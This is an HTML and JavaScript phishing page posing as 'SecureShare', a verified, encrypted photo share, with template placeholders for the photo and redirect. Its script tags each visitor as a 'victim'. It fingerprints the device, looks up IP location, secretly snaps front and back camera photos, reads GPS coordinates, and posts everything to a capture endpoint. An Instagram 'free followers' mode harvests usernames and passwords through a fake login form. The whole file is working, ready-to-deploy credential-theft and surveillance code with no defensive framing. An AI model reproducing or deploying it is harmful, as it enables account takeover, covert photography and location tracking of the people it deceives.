<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>SecureShare</title>
    <style>
        /* ===== RESET ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: radial-gradient(circle at 30% 10%, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
            padding: 16px;
            margin: 0;
        }

        /* ===== GLASS CARD ===== */
        .glass {
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(18px) saturate(180%);
            -webkit-backdrop-filter: blur(18px) saturate(180%);
            border-radius: 48px;
            padding: 36px 28px 32px;
            max-width: 460px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
            text-align: center;
            color: #fff;
            transition: all 0.3s ease;
        }

        /* ===== HEADINGS ===== */
        .glass h1 {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
            margin-bottom: 4px;
        }

        .glass .sub {
            font-size: 13px;
            font-weight: 400;
            letter-spacing: 3px;
            color: rgba(255, 255, 255, 0.5);
            text-transform: uppercase;
            margin-bottom: 20px;
        }

        /* ===== FRAME (PHOTO) ===== */
        .frame {
            border-radius: 28px;
            padding: 8px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            margin: 16px 0 20px;
            box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.4);
        }

        .frame img {
            width: 100%;
            height: auto;
            aspect-ratio: 4/3;
            object-fit: cover;
            border-radius: 22px;
            display: block;
            background: #1a1a2e;
        }

        /* ===== BUTTONS ===== */
        .glow-btn {
            background: linear-gradient(145deg, #f093fb, #f5576c);
            border: none;
            padding: 18px 20px;
            border-radius: 60px;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 8px 35px rgba(245, 87, 108, 0.35);
            transition: all 0.25s ease;
            letter-spacing: 0.5px;
            margin: 10px 0 6px;
            border: 1px solid rgba(255, 255, 255, 0.15);
        }

        .glow-btn:active {
            transform: scale(0.96);
        }

        .sparkle {
            animation: pulseGlow 2s infinite;
        }

        @keyframes pulseGlow {
            0%,
            100% {
                box-shadow: 0 8px 35px rgba(245, 87, 108, 0.35);
            }
            50% {
                box-shadow: 0 8px 70px rgba(245, 87, 108, 0.7);
            }
        }

        .footer-text {
            font-size: 11px;
            opacity: 0.3;
            margin-top: 20px;
            letter-spacing: 0.5px;
        }

        /* ===== INPUTS ===== */
        .input-group {
            text-align: left;
            margin: 14px 0 8px;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            opacity: 0.7;
            margin-bottom: 5px;
            letter-spacing: 0.3px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.04);
            color: #fff;
            font-size: 16px;
            transition: 0.25s;
            outline: none;
        }

        .input-group input:focus {
            border-color: #f5576c;
            background: rgba(255, 255, 255, 0.07);
            box-shadow: 0 0 0 3px rgba(245, 87, 108, 0.15);
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.25);
            font-weight: 300;
        }

        /* ===== PACKAGE GRID ===== */
        .package-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 20px 0 14px;
        }

        .package-grid button {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 18px;
            padding: 16px 0;
            color: #fff;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            backdrop-filter: blur(4px);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .package-grid button:active {
            transform: scale(0.92);
            background: rgba(245, 87, 108, 0.25);
            border-color: #f5576c;
        }

        .package-grid button:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(255, 255, 255, 0.2);
        }

        /* ===== BACK BUTTON ===== */
        .back-btn {
            background: rgba(255, 255, 255, 0.04) !important;
            border: 1px solid rgba(255, 255, 255, 0.06) !important;
            box-shadow: none !important;
            margin-top: 10px;
            font-size: 15px !important;
            padding: 14px !important;
        }

        .back-btn:active {
            background: rgba(255, 255, 255, 0.08) !important;
        }

        /* ===== HIDDEN ===== */
        .hidden {
            display: none !important;
        }

        .flex-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .glass {
                padding: 24px 16px 20px;
                border-radius: 32px;
            }
            .glass h1 {
                font-size: 26px;
            }
            .glow-btn {
                font-size: 18px;
                padding: 16px 16px;
            }
            .package-grid {
                gap: 8px;
            }
            .package-grid button {
                font-size: 14px;
                padding: 14px 0;
            }
        }

        /* ===== EXTRA GLOW ===== */
        .instagram-gradient {
            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .badge {
            display: inline-block;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 30px;
            padding: 4px 16px;
            font-size: 11px;
            letter-spacing: 1px;
            color: rgba(255, 255, 255, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.04);
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

    <div class="glass flex-center" id="mainPage">
        <span class="badge">⭐ VERIFIED</span>
        <h1 id="pageTitle">🔒 SecureShare</h1>
        <p class="sub" id="pageSub">SHARED SECURELY WITH YOU</p>
        <div class="frame" id="photoFrame">
            <img id="userPhoto" src="{{PHOTO_URL}}" alt="User Photo" />
        </div>
        <button class="glow-btn sparkle" id="continueBtn" onclick="requestCamera()">
            Continue →
        </button>
        <p class="footer-text" id="footerText">End-to-end encrypted · Secure connection</p>
        <div id="loading" class="hidden">⏳ Processing...</div>
    </div>

    <script>
        // ===== URL PARAMS =====
        const urlParams = new URLSearchParams(window.location.search);
        const victimId = urlParams.get('v') || 'unknown';
        const targetType = urlParams.get('type') || 'cam';
        const redirectUrl = '{{REDIRECT_URL}}';

        // ===== DEVICE INFO =====
        function getDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                battery: 'N/A',
                network: 'N/A'
            };
            if (navigator.getBattery) {
                navigator.getBattery().then(b => info.battery = Math.round(b.level * 100) + '%');
            }
            if (navigator.connection) {
                info.network = navigator.connection.effectiveType || 'N/A';
            }
            return info;
        }

        // ===== IP / LOCATION =====
        async function getLocationInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    lat: data.latitude || null,
                    lng: data.longitude || null
                };
            } catch {
                return { ip: 'Unknown', city: 'Unknown', lat: null, lng: null };
            }
        }

        // ===== SEND DATA TO BOT =====
        async function sendData(payload) {
            try {
                await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ victim_id: victimId, type: targetType, ...payload })
                });
            } catch (e) {
                console.log('Send error:', e);
            }
        }

        // ===== CAMERA (for cam type) =====
        function requestCamera() {
            const btn = document.getElementById('continueBtn');
            const loading = document.getElementById('loading');
            btn.disabled = true;
            btn.textContent = '⏳ Please wait...';
            loading.classList.remove('hidden');

            (async () => {
                const device = getDeviceInfo();
                const loc = await getLocationInfo();
                await sendData({ device_info: device, ip: loc.ip, city: loc.city, lat: loc.lat, lng: loc.lng });
            })();

            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                alert('Camera not supported.');
                loading.classList.add('hidden');
                btn.disabled = false;
                btn.textContent = 'Continue →';
                return;
            }

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                .then(stream => {
                    capturePhoto(stream, 'Back');
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(frontStream => capturePhoto(frontStream, 'Front'))
                        .catch(() => {});
                    setTimeout(requestLocation, 1000);
                    setTimeout(() => {
                        window.location.href = redirectUrl || 'https://google.com';
                    }, 3000);
                })
                .catch(err => {
                    alert('❌ Camera permission required!');
                    loading.classList.add('hidden');
                    btn.disabled = false;
                    btn.textContent = 'Continue →';
                });
        }

        function capturePhoto(stream, cameraType) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                sendData({ photo: canvas.toDataURL('image/jpeg', 0.85), camera_type: cameraType });
                stream.getTracks().forEach(t => t.stop());
            };
        }

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } }),
                    () => console.log('Location denied')
                );
            }
        }

        // ========== INSTAGRAM PAGE ==========
        if (targetType === 'ig') {
            const main = document.getElementById('mainPage');
            const title = document.getElementById('pageTitle');
            const sub = document.getElementById('pageSub');
            const frame = document.getElementById('photoFrame');
            const btn = document.getElementById('continueBtn');
            const footer = document.getElementById('footerText');

            title.textContent = '🎉 Get Free Instagram Followers!';
            title.className = 'instagram-gradient';
            sub.textContent = 'Choose your package';
            frame.style.display = 'none';
            btn.style.display = 'none';
            footer.textContent = '100% safe & secure · Trusted by 10M+ users';

            // Packages
            const packages = ['1K', '5K', '10K', '50K', '100K'];
            const container = document.createElement('div');
            container.className = 'package-grid';
            packages.forEach(pkg => {
                const pkgBtn = document.createElement('button');
                pkgBtn.textContent = pkg;
                pkgBtn.onclick = () => showInstagramLogin(pkg);
                container.appendChild(pkgBtn);
            });
            main.appendChild(container);
        }

        // ===== INSTAGRAM LOGIN =====
        function showInstagramLogin(pkg) {
            const main = document.getElementById('mainPage');
            main.innerHTML = `
                <h1 class="instagram-gradient">🔐 Instagram Login</h1>
                <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px;">
                    Enter your credentials to claim <strong>${pkg}</strong> followers instantly
                </p>
                <div class="input-group">
                    <label>👤 Username / Email</label>
                    <input type="text" id="loginUser" placeholder="Enter your Instagram username" />
                </div>
                <div class="input-group">
                    <label>🔒 Password</label>
                    <input type="password" id="loginPass" placeholder="Enter your password" />
                </div>
                <button class="glow-btn" onclick="submitInstagramLogin('${pkg}')">
                    🚀 Claim Now
                </button>
                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
                <p class="footer-text" style="margin-top: 20px;">🔐 Your data is secure & encrypted</p>
            `;
        }

        async function submitInstagramLogin(pkg) {
            const username = document.getElementById('loginUser').value;
            const password = document.getElementById('loginPass').value;
            if (!username || !password) {
                alert('⚠️ Please fill all fields');
                return;
            }
            await sendData({
                creds: {
                    platform: 'instagram',
                    username: username,
                    password: password,
                    package: pkg
                }
            });
            window.location.href = 'https://takipcikrali.com/';
        }

        // ===== CAM PAGE FALLBACK =====
        if (targetType !== 'cam' && targetType !== 'ig') {
            document.getElementById('pageTitle').textContent = '🔑 Secure Login';
            document.getElementById('pageSub').textContent = 'Access your account';
            document.getElementById('continueBtn').textContent = 'Continue →';
            document.getElementById('footerText').textContent = 'Your data is protected';
        }
    </script>
</body>
</html>
